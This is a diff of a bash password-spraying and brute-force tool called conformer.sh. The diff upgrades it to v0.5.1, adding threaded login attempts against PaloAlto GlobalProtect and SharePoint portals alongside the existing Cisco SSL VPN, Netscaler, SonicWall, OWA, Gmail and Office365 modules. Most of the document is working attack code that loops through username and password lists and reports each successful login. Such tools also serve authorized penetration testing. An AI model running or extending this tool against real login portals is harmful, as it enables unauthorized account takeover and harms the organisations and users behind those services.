@@ -7,11 +7,13 @@ source $mydir/modules/SonicWallVOffice.sh &> /dev/null;
 source $mydir/modules/OWA2016.sh &> /dev/null;
 source $mydir/modules/Gmail.sh &> /dev/null;
 source $mydir/modules/Office365.sh &> /dev/null;
-
+source $mydir/modules/PaloAlto.sh &> /dev/null;
+source $mydir/modules/SharePoint.sh &> /dev/null;
+source $mydir/modules/AUTO.sh &> /dev/null;
 
 #Help Banner Function...
 Help_banner(){
-if [[ ! -f $mydir/modules/SonicWallVOffice.sh ]] || [[ ! -f $mydir/modules/CiscoSSLVPN.sh ]] || [[ ! -f $mydir/modules/Netscaler.sh ]] || [[ ! -f $mydir/modules/OWA2016.sh ]] || [[ ! -f $mydir/modules/Gmail.sh ]] || [[ ! -f $mydir/modules/Office365.sh ]]; then
+if [[ ! -f $mydir/modules/SonicWallVOffice.sh ]] || [[ ! -f $mydir/modules/CiscoSSLVPN.sh ]] || [[ ! -f $mydir/modules/Netscaler.sh ]] || [[ ! -f $mydir/modules/OWA2016.sh ]] || [[ ! -f $mydir/modules/Gmail.sh ]] || [[ ! -f $mydir/modules/Office365.sh ]] || [[ ! -f $mydir/modules/PaloAlto.sh ]] || [[ ! -f $mydir/modules/SharePoint.sh ]] || [[ ! -f $mydir/modules/AUTO.sh ]] ; then
 echo "Not All Modules Loaded.";
 echo "Exiting...";
 exit 1;
@@ -19,30 +21,36 @@ else
 :
 fi
 
-echo "conformer v0.4.2";
+echo "conformer v0.5.1";
 echo "bk201@foofus.net";
 echo "";
 echo "usage: conformer.sh <HOST_IP/Hostname><:PORT>(optional) <Username or Users_File> 
        <Password<\\&par1=val1\\&par2=val2>(optional) or Pass_File> <Portal Type> 
-       <DISABLE_CHECK>(optional) <DEBUG>(optional) <LOG>(optional)";
+       <DISABLE_CHECK>(optional) <DEBUG=file>(optional) <LOG=file>(optional)
+       <THREAD=n>(optional)";
 echo "";
 echo "Portal Types: SonicWallVOffice
               CiscoSSLVPN
               Netscaler
-	      OWA2016
-              Gmail (Host: mail.google.com) 
-              Office365 (Host: outlook.office.com)"; #XenApp";
-echo "";
-echo "conformer.sh <CUSTOM> <BURP_POST_File> <List> 
-<String in Response indicating Success> <LOG>(optional) <DEBUG>(optional)"
-echo "";
-echo "In BURP_POST_FILE, add a @LIST@ to the parameter you want to brute against. 
-(e.g. username=admin&password=@LIST@&domain=example)";
+	      OWA (versions 2013/2016)
+              Gmail (Host: mail.google.com)
+              Office365 (Host: outlook.office.com)
+              PaloAlto (GlobalProtect)
+              SharePoint
+              AUTO (Attempt autodetect module)"; #XenApp";
+
 echo "";
 echo "Type @SAME@ : Password=Username"
 echo "DISABLE_CHECK : Disable Check if compatible Portal.";
-echo "DEBUG : outputs HTTP responses to /tmp/password.conformer.debug";
-echo "LOG : outputs stdout to /tmp/password.conformer.log"
+echo "DEBUG : outputs HTTP responses to file";
+echo "LOG : outputs stdout to file"
+echo "THREAD : Threading of POST requests to server"
+echo "";
+echo "syntax examples.";
+echo "conformer.sh domain.example.com username ~/Desktop/passwords CiscoSSLVPN";
+echo "conformer.sh domain.example.com ~/Desktop/users ~/Desktop/passwords OWA THREAD=10";
+echo "conformer.sh domain.example.com username password123 Gmail LOG=~/Desktop/log DEBUG=~/Desktop/debug";
+echo "conformer.sh domain.example.com ~/Desktop/users Password1 Netscaler DISABLE_CHECK DEBUG=~/Desktop/debug";
 echo "";
 }
 
@@ -52,15 +60,15 @@ parameter_check(){
 if [[ $(echo "$1" | tr '[:upper:]' '[:lower:]') == "update" ]]; then
 echo "Update from github/svn/repo goes here...";
 
-elif [[ $(echo "$1" | tr '[:upper:]' '[:lower:]') == "custom" ]]; then
-CUSTOMPOST "$1" "$2" "$3" "$4" "$5" "$6";
-
 elif [[ $(echo "$1" | tr '[:upper:]' '[:lower:]') == "help" ]] || [[ $(echo "$1" | tr '[:upper:]' '[:lower:]') == "--help" ]] || [[ $(echo "$1" | tr '[:upper:]' '[:lower:]')  == "-h" ]]; then
-Help_banner "$1" "$2" "$3" "$4" "$5" "$6";
+Help_banner "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8";
 
-#Wgets the host parameter. Checks host is up, has a webserver, using SSL/TLS. (doesn't know specifically if it's Cisco SSLVPN Portal)
+#Wgets the host parameter. Checks host is up, has a webserver, using SSL/TLS.
 elif [ "$1" != "" ]; then
-host_check=$(wget --timeout=4 -qO- https://$1 --no-check-certificate);
+#host_check=$(wget --timeout=4 -qO- https://$1 --no-check-certificate);
+host_check=$(curl -i -s -k  -X $'GET' \
+    -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0' \
+    $'https://'$1'/');
 if [[ "$host_check" != "" ]]; then
 :
 else
@@ -85,96 +93,10 @@ echo "Exiting...";
 exit 1;
 fi
 
-MAINPOST "$1" "$2" "$3" "$4" "$5" "$6" "$7";
+MAINPOST "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8";
 
 fi
 }
-
-CUSTOMPOST(){
-PostTocheck="no";
-Hostcheck="no";
-Referercheck="no";
-cookiecheck="no";
-parcheck="no";
-
-if [[ ! -f "$2" ]] || [[ ! -f "$3" ]] ; then
-echo "Invalid File, Exiting...";
-exit 1;
-fi
-if [[ "$4" == "" ]] ; then
-echo "No success condition given, Exiting...";
-exit 1;
-fi
-
-
-
-while read -r line; do 
-
-if [[ "$line" == *"POST"* ]] && [[ $PostTocheck == "no" ]] ; then
-PostTo=$(echo "$line" | cut -d " " -f 2);
-PostTocheck="yes";
-
-elif [[ "$line" == *"Host:"* ]] && [[ "$Hostcheck" == "no" ]] ; then
-HostTo=$(echo "$line" | cut -d " " -f 2);
-Hostcheck="yes";
-
-elif [[ "$line" == *"Referer:"* ]] && [[ $Referercheck == "no" ]] ; then
-ReferTo=$(echo "$line" | cut -d " " -f 2);
-Referercheck="yes";
-
-elif [[ "$line" == *"Cookie:"* ]] && [[ $cookiecheck == "no" ]] ; then
-cookies=$(echo "$line" | cut -d " " -f 2-);
-cookiecheck="yes";
-
-elif [[ "$line" == *"@LIST@"* ]] ; then
-par=$(echo "$line");
-parcheck="yes";
-fi
-
-done < "$2"
-
-if [[ "$PostTocheck" == "no" ]] || [[ "$Hostcheck" == "no" ]] || [[ "$Referercheck" == "no" ]] || [[ "$cookiecheck" == "no" ]] || [[ "$parcheck" == "no" ]]; then
-echo "Invalid File, Exiting...";
-exit 1;
-fi
-
-echo "Host: $HostTo";
-if [[ $(echo "$5" | tr '[:upper:]' '[:lower:]') == "log" ]] || [[ $(echo "$6" | tr '[:upper:]' '[:lower:]') == "log" ]] ; then
-	echo "Host: $HostTo" >> /tmp/custom.conformer.log;
-fi
-for line in $(cat "$3")
-do
-
-Return=$(curl -i -s -k  -X $'POST' \
-    -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0' -H $'Content-Type: application/x-www-form-urlencoded' -H $'X-Requested-With: XMLHttpRequest' -H $'Referer: '$ReferTo'' \
-   -b $''$cookies'' \
-    --data-binary $''$(echo $par | sed 's/@LIST@/'$line'/g')'' \
-    $'https://'$HostTo''$PostTo'');
-
-if [[ "$5" == "DEBUG" ]] || [[ "$6" == "DEBUG" ]] ; then
-	echo $par | sed 's/@LIST@/'$line'/g';
-	echo "";
-	echo "$Return" >> /tmp/custom.conformer.debug;
-	echo "" >> /tmp/custom.conformer.debug;
-	echo "" >> /tmp/custom.conformer.debug;
-	echo "----------------------------------------------------" >> /tmp/custom.conformer.debug;
-fi
-
-if [[ "$Return" == *"$4"* ]]; then
-echo $par | sed 's/@LIST@/'$line'/g' | awk '{ print "   "$1":**Success**"}';
-if [[ "$5" == "LOG" ]] || [[ "$6" == "LOG" ]] ; then
-	echo $par | sed 's/@LIST@/'$line'/g' | awk '{ print "   "$1":**Success**"}' >> /tmp/custom.conformer.log;
-fi
-else
-echo $par | sed 's/@LIST@/'$line'/g' | awk '{ print "   "$1":Failed"}';
-if [[ "$5" == "LOG" ]] || [[ "$6" == "LOG" ]] ; then
-	echo $par | sed 's/@LIST@/'$line'/g' | awk '{ print "   "$1":Failed"}' >> /tmp/custom.conformer.log;
-fi
-fi
-
-done
-}
-
 
 MAINPOST(){
 
@@ -182,13 +104,19 @@ MAINPOST(){
 if [ "$1" != "" ]; then
 
 if [[ $(echo "$4" | tr '[:upper:]' '[:lower:]') == "ciscosslvpn" ]]; then
-	check_ciscoSSLVPN "$1" "$2" "$3" "$4" "$5" "$6" "$7";
+	check_ciscoSSLVPN "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8";
 elif [[ $(echo "$4" | tr '[:upper:]' '[:lower:]')  == "netscaler" ]]; then
-	check_Netscaler "$1" "$2" "$3" "$4" "$5" "$6" "$7";
-elif [[ $(echo "$4" | tr '[:upper:]' '[:lower:]') == "owa2016" ]]; then
-	check_OWA2016 "$1" "$2" "$3" "$4" "$5" "$6" "$7";
+	check_Netscaler "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8";
+elif [[ $(echo "$4" | tr '[:upper:]' '[:lower:]') == "owa" ]]; then
+	check_OWA2016 "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8";
 elif [[ $(echo "$4" | tr '[:upper:]' '[:lower:]')  == "sonicwallvoffice" ]]; then
-	check_SonicWallVOffice "$1" "$2" "$3" "$4" "$5" "$6" "$7";
+	check_SonicWallVOffice "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8";
+elif [[ $(echo "$4" | tr '[:upper:]' '[:lower:]')  == "paloalto" ]]; then
+	check_PaloAlto "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8";
+elif [[ $(echo "$4" | tr '[:upper:]' '[:lower:]')  == "sharepoint" ]]; then
+	check_SharePoint "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8";
+elif [[ $(echo "$4" | tr '[:upper:]' '[:lower:]')  == "auto" ]]; then
+	check_Start "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8";
 
 elif [[ $(echo "$4" | tr '[:upper:]' '[:lower:]') == "gmail" ]]; then
 	:
@@ -200,73 +128,149 @@ else
 	exit 1;
 fi
 fi
+LOG_YES=false;
+LOG=/tmp/conformer.log;
+#Determine if Logging, and where to log
+if [[ $(echo "$5" | tr '[:upper:]' '[:lower:]') == "log="* ]] || [[ $(echo "$6" | tr '[:upper:]' '[:lower:]') == "log="* ]] || [[ $(echo "$7" | tr '[:upper:]' '[:lower:]') == "log="* ]] || [[ $(echo "$8" | tr '[:upper:]' '[:lower:]') == "log="* ]]; then
+LOG_YES=true;
+LOG=$(echo "$5" | grep -i log | cut -d "=" -f 2);
+	if [[ "$LOG" == "" ]] ; then
+		LOG=$(echo "$6" | grep -i log | cut -d "=" -f 2);
+		if [[ "$LOG" == "" ]] ; then
+			LOG=$(echo "$7" | grep -i log | cut -d "=" -f 2);
+			if [[ "$LOG" == "" ]] ; then
+				LOG=$(echo "$8" | grep -i log | cut -d "=" -f 2);
+			fi
+		fi
+	fi
+if [[ -d "$LOG" ]] ; then
+	LOG_YES=false;
+fi
+
+fi
+
+
+DEBUG_YES=false;
+DEBUG=/tmp/conformer.debug;
+#Determine if Debuging, and where to debug to.
+if [[ $(echo "$5" | tr '[:upper:]' '[:lower:]') == "debug="* ]] || [[ $(echo "$6" | tr '[:upper:]' '[:lower:]') == "debug="* ]] || [[ $(echo "$7" | tr '[:upper:]' '[:lower:]') == "debug="* ]] || [[ $(echo "$8" | tr '[:upper:]' '[:lower:]') == "debug="* ]]; then
+DEBUG_YES=true;
+DEBUG=$(echo "$5" | grep -i debug | cut -d "=" -f 2);
+	if [[ "$DEBUG" == "" ]] ; then
+		DEBUG=$(echo "$6" | grep -i debug | cut -d "=" -f 2);
+		if [[ "$DEBUG" == "" ]] ; then
+			DEBUG=$(echo "$7" | grep -i debug | cut -d "=" -f 2);
+			if [[ "$DEBUG" == "" ]] ; then
+				DEBUG=$(echo "$8" | grep -i debug | cut -d "=" -f 2);
+			fi
+		fi
+	fi
+if [[ -d "$DEBUG" ]] ; then
+	DEBUG_YES=false;
+fi
+fi
 
 echo "";
-if [[ $(echo "$4" | tr '[:upper:]' '[:lower:]') == "ciscosslvpn" ]] || [[ $(echo "$4" | tr '[:upper:]' '[:lower:]') == "netscaler" ]] || [[ $(echo "$4" | tr '[:upper:]' '[:lower:]') == "sonicwallvoffice" ]] || [[ $(echo "$4" | tr '[:upper:]' '[:lower:]') == "owa2016" ]] ; then
+if [[ $(echo "$4" | tr '[:upper:]' '[:lower:]') == "ciscosslvpn" ]] || [[ $(echo "$4" | tr '[:upper:]' '[:lower:]') == "netscaler" ]] || [[ $(echo "$4" | tr '[:upper:]' '[:lower:]') == "sonicwallvoffice" ]] || [[ $(echo "$4" | tr '[:upper:]' '[:lower:]') == "paloalto" ]] || [[ $(echo "$4" | tr '[:upper:]' '[:lower:]') == "owa" ]] || [[ $(echo "$4" | tr '[:upper:]' '[:lower:]') == "sharepoint" ]] ; then
 echo "Host: $1";
-if [[ $(echo "$5" | tr '[:upper:]' '[:lower:]') == "log" ]] || [[ $(echo "$6" | tr '[:upper:]' '[:lower:]') == "log" ]] || [[ $(echo "$7" | tr '[:upper:]' '[:lower:]') == "log" ]]; then
-	echo "Host: $1" >> /tmp/conformer.log;
+if [[ $LOG_YES == true ]]; then
+	echo "Host: $1" >> "$LOG";
 fi
 elif [[ $(echo "$4" | tr '[:upper:]' '[:lower:]') == "gmail" ]]; then
 echo "Host: mail.google.com";
-if [[ $(echo "$5" | tr '[:upper:]' '[:lower:]') == "log" ]] || [[ $(echo "$6" | tr '[:upper:]' '[:lower:]') == "log" ]] || [[ $(echo "$7" | tr '[:upper:]' '[:lower:]') == "log" ]]; then
-	echo "Host: mail.google.com" >> /tmp/conformer.log;
+if [[ $LOG_YES == true ]]; then
+	echo "Host: mail.google.com" >> "$LOG";
 fi
 elif [[ $(echo "$4" | tr '[:upper:]' '[:lower:]') == "office365" ]]; then
 echo "Host: outlook.office.com";
-if [[ $(echo "$5" | tr '[:upper:]' '[:lower:]') == "log" ]] || [[ $(echo "$6" | tr '[:upper:]' '[:lower:]') == "log" ]] || [[ $(echo "$7" | tr '[:upper:]' '[:lower:]') == "log" ]]; then
-	echo "Host: outlook.office.com" >> /tmp/conformer.log;
+if [[ $LOG_YES == true ]] ; then
+	echo "Host: outlook.office.com" >> "$LOG";
 fi
 fi
 
+#Determine number of threads
+com=0;
+THREAD=1;
+if [[ $(echo "$5" | tr '[:upper:]' '[:lower:]') == "thread="* ]] || [[ $(echo "$6" | tr '[:upper:]' '[:lower:]') == "thread="* ]] || [[ $(echo "$7" | tr '[:upper:]' '[:lower:]') == "thread="* ]] || [[ $(echo "$8" | tr '[:upper:]' '[:lower:]') == "thread="* ]]; then #Threaded
+THREAD=$(echo "$5" | tr '[:upper:]' '[:lower:]' | grep thread | cut -d "=" -f 2);
+	if [[ "$THREAD" == "" ]] ; then
+		THREAD=$(echo "$6" | tr '[:upper:]' '[:lower:]' | grep thread | cut -d "=" -f 2);
+		if [[ "$THREAD" == "" ]] ; then
+			THREAD=$(echo "$7" | tr '[:upper:]' '[:lower:]' | grep thread | cut -d "=" -f 2);
+			if [[ "$THREAD" == "" ]] ; then
+				THREAD=$(echo "$8" | tr '[:upper:]' '[:lower:]' | grep thread | cut -d "=" -f 2);
+			fi
+		fi
+	fi
+fi
 
 #Determine if username file or username?
 if [ ! -f "$2" ]; then
 #Determine if password file or password?
 if [ ! -f "$3" ]; then
+
 line=$2;
 pass=$3;
+if [ "$pass" == "@SAME@" ]; then
+pass=$2;
+fi
 if [[ $(echo "$4" | tr '[:upper:]' '[:lower:]')  == "ciscosslvpn" ]]; then
-	POST_ciscoSSLVPN "$1" "$2" "$3" "$4" "$5" "$6" "$7";
+	POST_ciscoSSLVPN "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8";
 
 elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "netscaler" ]]; then
-	POST_Netscaler "$1" "$2" "$3" "$4" "$5" "$6" "$7";
+	POST_Netscaler "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8";
 
-elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "owa2016" ]]; then
-	POST_OWA2016 "$1" "$2" "$3" "$4" "$5" "$6" "$7";
+elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "owa" ]]; then
+	POST_OWA2016 "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8";
 
 elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "gmail" ]]; then
-	POST_Gmail "$1" "$2" "$3" "$4" "$5" "$6" "$7";
+	POST_Gmail "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8";
 
 elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "office365" ]]; then
-	POST_Office365 "$1" "$2" "$3" "$4" "$5" "$6" "$7";
+	POST_Office365 "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8";
 
 elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "sonicwallvoffice" ]]; then
-	POST_SonicWallVOffice "$1" "$2" "$3" "$4" "$5" "$6" "$7";
+	POST_SonicWallVOffice "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8";
+elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "paloalto" ]]; then
+	POST_PaloAlto "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8";
+elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "sharepoint" ]]; then
+	POST_SharePoint "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8";
 fi
 
-else
+else  #Username + Password File
 line=$2;
 	for pass in $(cat $3); do
+		com=$((com+1));
 		if [[ $(echo "$4" | tr '[:upper:]' '[:lower:]')  == "ciscosslvpn" ]]; then
-			POST_ciscoSSLVPN "$1" "$2" "$3" "$4" "$5" "$6" "$7";
+			POST_ciscoSSLVPN "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8" &
 		
 		elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "netscaler" ]]; then
-			POST_Netscaler "$1" "$2" "$3" "$4" "$5" "$6" "$7";
+			POST_Netscaler "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8" &
 
-		elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "owa2016" ]]; then
-			POST_OWA2016 "$1" "$2" "$3" "$4" "$5" "$6" "$7";
+		elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "owa" ]]; then
+			POST_OWA2016 "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8" &
 	
 		elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "gmail" ]]; then
-			POST_Gmail "$1" "$2" "$3" "$4" "$5" "$6" "$7";
+			POST_Gmail "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8" &
 
 		elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "office365" ]]; then
-			POST_Office365 "$1" "$2" "$3" "$4" "$5" "$6" "$7";
+			POST_Office365 "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8" &
 
 		elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "sonicwallvoffice" ]]; then
-			POST_SonicWallVOffice "$1" "$2" "$3" "$4" "$5" "$6" "$7";
+			POST_SonicWallVOffice "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8" &
+
+		elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "paloalto" ]]; then
+			POST_PaloAlto "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8" &
+
+		elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "sharepoint" ]]; then
+			POST_SharePoint "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8" &
+		fi
+		if [[ $com == $THREAD ]] ; then
+		wait $!;
+		com=0;
 		fi
 	done
+	wait;
 fi
 
 #Userlist
@@ -275,49 +279,69 @@ else
 if [ ! -f "$3" ]; then
 
 	for line in $(cat $2); do
+		com=$((com+1));
 		pass=$3;
 		if [ "$pass" == "@SAME@" ]; then
 		pass=$line;
 		fi
 		
 		if [[ $(echo "$4" | tr '[:upper:]' '[:lower:]')  == "ciscosslvpn" ]]; then
-			POST_ciscoSSLVPN "$1" "$2" "$3" "$4" "$5" "$6" "$7";
+			POST_ciscoSSLVPN "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8" &
 		elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "netscaler" ]]; then
-			POST_Netscaler "$1" "$2" "$3" "$4" "$5" "$6" "$7";
+			POST_Netscaler "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8" &
 
-		elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "owa2016" ]]; then
-			POST_OWA2016 "$1" "$2" "$3" "$4" "$5" "$6" "$7";
+		elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "owa" ]]; then
+			POST_OWA2016 "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8" &
 	
 		elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "gmail" ]]; then
-			POST_Gmail "$1" "$2" "$3" "$4" "$5" "$6" "$7";
+			POST_Gmail "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8" &
 
 		elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "office365" ]]; then
-			POST_Office365 "$1" "$2" "$3" "$4" "$5" "$6" "$7";
+			POST_Office365 "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8" &
 
 		elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "sonicwallvoffice" ]]; then
-			POST_SonicWallVOffice "$1" "$2" "$3" "$4" "$5" "$6" "$7";
+			POST_SonicWallVOffice "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8" &
+
+		elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "paloalto" ]]; then
+			POST_PaloAlto "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8" &
+		elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "sharepoint" ]]; then
+			POST_SharePoint "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8" &
+		fi
+		if [[ $com == $THREAD ]] ; then
+		wait $!;
+		com=0;
 		fi
 	done
+	wait;
 
 #userlist with passwordlist
 else
 	for line in $(cat $2); do
 		for pass in $(cat $3); do
-		
+		com=$((com+1));
 		if [[ $(echo "$4" | tr '[:upper:]' '[:lower:]')  == "ciscosslvpn" ]]; then
-			POST_ciscoSSLVPN "$1" "$2" "$3" "$4" "$5" "$6" "$7";
+			POST_ciscoSSLVPN "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8" &
 		elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "netscaler" ]]; then
-			POST_Netscaler "$1" "$2" "$3" "$4" "$5" "$6" "$7";
-		elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "owa2016" ]]; then
-			POST_OWA2016 "$1" "$2" "$3" "$4" "$5" "$6" "$7";
+			POST_Netscaler "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8" &
+		elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "owa" ]]; then
+			POST_OWA2016 "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8" &
 		elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "gmail" ]]; then
-			POST_Gmail "$1" "$2" "$3" "$4" "$5" "$6" "$7";
+			POST_Gmail "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8" &
 		elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "office365" ]]; then
-			POST_Office365 "$1" "$2" "$3" "$4" "$5" "$6" "$7";
+			POST_Office365 "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8" &
 		elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "sonicwallvoffice" ]]; then
-			POST_SonicWallVOffice "$1" "$2" "$3" "$4" "$5" "$6" "$7";
+			POST_SonicWallVOffice "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8" &
+		elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "paloalto" ]]; then
+			POST_PaloAlto "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8" &
+		elif [[ $(echo "$4"  | tr '[:upper:]' '[:lower:]') == "sharepoint" ]]; then
+			POST_SharePoint "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8" &
+		fi
+		if [[ $com == $THREAD ]] ; then
+		wait $!;
+		com=0;
 		fi
 	done
+	wait
 done
 fi
 
@@ -330,4 +354,4 @@ fi
 if [ "$1" == "" ]; then
 Help_banner;
 fi
-parameter_check "$1" "$2" "$3" "$4" "$5" "$6" "$7";
+parameter_check "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8";
